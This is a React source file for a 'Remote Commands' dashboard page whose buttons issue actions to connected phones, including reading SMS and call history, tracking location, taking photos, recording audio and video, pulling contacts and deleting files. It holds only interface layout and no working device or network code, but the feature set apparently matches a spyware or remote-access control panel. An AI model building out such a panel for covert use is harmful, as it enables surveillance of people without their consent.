import DashboardLayout from "@/components/DashboardLayout";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import {
  MessageSquare,
  Phone,
  MapPin,
  Camera,
  Mic,
  FileText,
  Wifi,
  Shield,
  Download,
  Upload,
  Trash2,
  Lock,
} from "lucide-react";

const Commands = () => {
  const commandCategories = [
    {
      title: "Communication",
      commands: [
        { icon: MessageSquare, label: "Send SMS", action: "send-sms" },
        { icon: MessageSquare, label: "Get SMS History", action: "get-sms" },
        { icon: Phone, label: "Make Call", action: "make-call" },
        { icon: Phone, label: "Call History", action: "call-history" },
      ],
    },
    {
      title: "Location & Sensors",
      commands: [
        { icon: MapPin, label: "Get Location", action: "get-location" },
        { icon: Camera, label: "Take Photo", action: "take-photo" },
        { icon: Mic, label: "Record Audio", action: "record-audio" },
        { icon: Camera, label: "Record Video", action: "record-video" },
      ],
    },
    {
      title: "Data Management",
      commands: [
        { icon: FileText, label: "Get Contacts", action: "get-contacts" },
        { icon: Download, label: "Download File", action: "download-file" },
        { icon: Upload, label: "Upload File", action: "upload-file" },
        { icon: Trash2, label: "Delete Files", action: "delete-files" },
      ],
    },
    {
      title: "System Control",
      commands: [
        { icon: Wifi, label: "WiFi Status", action: "wifi-status" },
        { icon: Shield, label: "Get Apps List", action: "get-apps" },
        { icon: Lock, label: "Lock Device", action: "lock-device" },
        { icon: Trash2, label: "Clear Cache", action: "clear-cache" },
      ],
    },
  ];

  return (
    <DashboardLayout>
      <div className="p-8">
        {/* Header */}
        <div className="mb-8">
          <h1 className="text-3xl font-bold text-foreground mb-2">
            Remote Commands
          </h1>
          <p className="text-muted-foreground">
            Execute commands on connected devices
          </p>
        </div>

        {/* Command Categories */}
        <div className="space-y-6">
          {commandCategories.map((category, idx) => (
            <Card key={idx} className="p-6 bg-card border-border">
              <h2 className="text-xl font-semibold text-foreground mb-4">
                {category.title}
              </h2>
              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
                {category.commands.map((cmd, cmdIdx) => {
                  const Icon = cmd.icon;
                  return (
                    <Button
                      key={cmdIdx}
                      variant="outline"
                      className="h-auto flex-col gap-3 p-6 hover:bg-primary/10 hover:border-primary transition-all duration-300"
                    >
                      <div className="p-3 rounded-lg bg-primary/10">
                        <Icon className="w-6 h-6 text-primary" />
                      </div>
                      <span className="font-medium text-foreground">
                        {cmd.label}
                      </span>
                    </Button>
                  );
                })}
              </div>
            </Card>
          ))}
        </div>

        {/* Quick Actions */}
        <Card className="p-6 bg-card border-border mt-6">
          <h2 className="text-xl font-semibold text-foreground mb-4">
            Quick Actions
          </h2>
          <div className="flex flex-wrap gap-3">
            <Button className="bg-primary hover:bg-primary/90 text-primary-foreground">
              Execute Custom Command
            </Button>
            <Button variant="outline">View Command History</Button>
            <Button variant="outline">Schedule Commands</Button>
          </div>
        </Card>
      </div>
    </DashboardLayout>
  );
};

export default Commands;
